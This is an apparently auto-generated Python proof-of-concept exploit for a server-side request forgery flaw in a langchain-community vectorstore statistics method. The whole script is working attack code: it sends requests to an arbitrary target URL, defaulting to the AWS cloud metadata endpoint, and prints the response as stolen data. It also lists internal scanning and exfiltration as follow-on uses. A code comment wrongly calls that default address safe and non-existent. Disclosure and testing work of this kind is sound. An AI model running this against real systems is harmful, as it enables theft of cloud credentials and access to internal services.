#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_url_concatenating_self_get_vectorstore_statistics_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community-only VectorStore statistics endpoint.

Vulnerability: The get_vectorstore_statistics method constructs a URL by concatenating
self.url with '/v1/statistics' and makes a POST request. self.url is user-controlled
and not validated, allowing SSRF to internal services or cloud metadata endpoints.

This PoC demonstrates the vulnerability by:
1. Creating a malicious instance with an attacker-controlled URL
2. Triggering the vulnerable method to make a request to an internal endpoint
3. Capturing and displaying the response (reflective SSRF)

Usage:
    python poc_ssrf.py [target_url]

    target_url: The URL to send the SSRF request to (default: http://169.254.169.254/latest/meta-data/)
"""

import sys
import json
import requests
from typing import Any, Dict, Optional


class MockVectorStore:
    """
    Minimal reproduction of the vulnerable class from langchain-community.
    Only contains the vulnerable __init__ and get_vectorstore_statistics methods.
    """
    
    def __init__(self, url: str):
        """
        Initialize with attacker-controlled URL.
        No validation or sanitization is performed.
        """
        self.url = url.rstrip('/')  # Remove trailing slash for clean concatenation
    
    def get_vectorstore_statistics(self) -> Dict[str, Any]:
        """
        Vulnerable method: constructs URL by concatenation and makes POST request.
        Returns the JSON response directly to the caller.
        """
        # VULNERABLE: Direct string concatenation with user-controlled input
        url = self.url + "/v1/statistics"
        
        print(f"[*] Making POST request to: {url}")
        
        try:
            response = requests.post(
                url,
                json={},
                headers={"Content-Type": "application/json"},
                timeout=10  # Add timeout to prevent hanging
            )
            print(f"[*] Response status code: {response.status_code}")
            print(f"[*] Response headers: {dict(response.headers)}")
            
            # Return the response content (could be sensitive data)
            try:
                return response.json()
            except json.JSONDecodeError:
                return {"raw_text": response.text}
                
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {e}")
            return {"error": f"Connection failed: {str(e)}"}
        except requests.exceptions.Timeout as e:
            print(f"[!] Timeout error: {e}")
            return {"error": f"Request timed out: {str(e)}"}
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return {"error": f"Request failed: {str(e)}"}


def demonstrate_ssrf(target_url: str) -> None:
    """
    Demonstrate the SSRF vulnerability by creating a malicious instance
    and triggering the vulnerable method.
    
    Args:
        target_url: The internal URL to target (e.g., cloud metadata endpoint)
    """
    print(f"[*] Creating malicious VectorStore instance with URL: {target_url}")
    
    # Create instance with attacker-controlled URL
    store = MockVectorStore(url=target_url)
    
    print("[*] Triggering vulnerable get_vectorstore_statistics method...")
    print("[*] This will make a POST request to: " + target_url + "/v1/statistics")
    print()
    
    # Trigger the vulnerability
    result = store.get_vectorstore_statistics()
    
    print()
    print("[*] Response received from target:")
    print(json.dumps(result, indent=2, default=str))
    
    # Check if we got useful data (indicating successful SSRF)
    if result and "error" not in result:
        print("\n[!] SUCCESS: SSRF attack worked! Data was retrieved from the target.")
        print("[!] This demonstrates that an attacker can access internal services.")
    else:
        print("\n[-] The request may have failed or the target is not accessible.")
        print("[-] This is expected if you're not running in a cloud environment.")


def main() -> None:
    """
    Main entry point with configurable target URL.
    Default target is AWS metadata endpoint (classic example).
    """
    # Default to a safe, non-existent internal address for demonstration
    # Change this to test against actual internal services
    default_target = "http://169.254.169.254/latest/meta-data"
    
    # Allow command-line override
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = default_target
        print("[*] No target specified, using default AWS metadata endpoint")
        print("[*] To target a different service, provide URL as argument")
        print()
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for langchain-community-only")
    print("=" * 60)
    print()
    
    demonstrate_ssrf(target_url)
    
    print()
    print("=" * 60)
    print("Demonstration complete.")
    print("In a real attack, an attacker could:")
    print("  - Access cloud metadata endpoints (AWS/GCP/Azure)")
    print("  - Scan internal network services")
    print("  - Access internal APIs and databases")
    print("  - Exfiltrate sensitive data from internal systems")
    print("=" * 60)


if __name__ == "__main__":
    main()
